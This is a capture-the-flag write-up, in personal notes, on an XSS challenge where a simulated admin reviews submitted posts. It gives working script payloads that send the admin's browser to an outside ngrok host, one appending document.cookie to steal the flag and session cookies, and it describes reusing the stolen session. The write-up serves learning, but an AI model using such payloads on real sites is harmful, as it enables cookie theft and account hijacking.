# Notes

The challenge includes a link to a website. Based on the name of the challenge (as determined from the fragment path when linking to that specific challenge) this probably involves XSS.

There is a text area on the page which will POST to the server. This would be an obvious avenue for possible XSS vulnerability.

However, I haven't seen anything to indicate that that the content from that text area sent to the server is actually displayed anywhere. Submitting the form gives back a response with a static message "Your post was submitted for review. Administator will take a look shortly."

There is an "Admin" link which goes to the `/admin` path, but it returns a `303 See Other` response with an empty body and the location being the root path.

I can browse the directories under `/static` which includes the CSS file and two images displayed on the root page, but no other files are present. There is no `static/images/flag.png` or (or `.jpg`).

I might need to come back to this.

(the next day)

Someone on the John Hammond Discord was willing to trade hints with me (for some help with reversing-emoji). They mentioned that this was an XSS attack to get cookies data. They also mentioned requestbin (which I hadn't heard of).

I was misunderstanding what was involved with this kind of challenge - there's basically an automated simulation of an admin user who will "check" the uploaded post. I assumed that my data was going into a black hole, but it's actually being requested and executed by a browser somewhere on the CTF servers.

With this knowledge, and a cursory glance at what requestbin does, I figured out that I could use XSS to direct the "admin" browser to a different URL (I used ngrok for this since I have it installed already). I was able to confirm it with the following XSS attack value: `<script>document.location = "http://xxxxxx.ngrok.io/";</script>`.

With that confirmed, and knowing that the cookie data is perhaps what I need (maybe to access the admin panel, idk). I tried the following XSS attack value: `<script>document.location = "http://xxxxxx.ngrok.io/?cookie=" + encodeURI(document.cookie);</script>`. This sent a request to my ngrok instance which included a `flag` cookie with the flag as its value:
```
CTF{8aaa2f34b392b415601804c2f5f0f24e}
```

It also included a `session` cookie which I figured I could add to my browser to gain access to the admin panel. Trying that, the admin page yielded the same flag from above.
